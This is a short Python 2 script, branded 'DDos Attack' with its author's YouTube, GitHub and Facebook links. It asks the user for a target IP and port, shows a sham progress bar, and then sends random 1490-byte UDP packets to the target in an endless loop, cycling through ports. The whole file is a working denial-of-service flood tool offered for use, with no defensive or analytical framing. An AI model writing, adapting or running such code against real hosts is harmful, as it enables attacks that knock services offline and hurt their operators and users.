import sys
import os
import time
import socket
import random
# from pyfiglet import Figlet
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls") # clear for linux
# os.system("figlet DDos Attack") # figlet for linux

# me
# f = Figlet(font='slant') for windows
# print (f.renderText('DDos Attack')) for windows

print
print ("Author   : HA-MRX")
print ("You Tube : https://www.youtube.com/c/HA-MRX")
print ("github   : https://github.com/Ha3MrX")
print ("Facebook : https://www.facebook.com/muhamad.jabar222")
print
ip = raw_input("IP Target : ") # raw_input
port = input("Port       : ")

os.system("cls") # clear for linux
# os.system("figlet Attack Starting") # figlet for linux

# me
# f = Figlet(font='slant')
# print (f.renderText('Attack Starting')) 

# usless
print ("[                    ] 0% ")
time.sleep(5)
os.system("cls")
print ("[=====               ] 25%")
time.sleep(5)
os.system("cls")
print ("[==========          ] 50%")
time.sleep(5)
os.system("cls")
print ("[===============     ] 75%")
time.sleep(5)
os.system("cls")
print ("[====================] 100%")
time.sleep(5)
os.system("cls")

sent = 0
while True:
     sock.sendto(bytes, (ip, port)) # sock.sendto(bytes, (ip,port)) sur linux
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1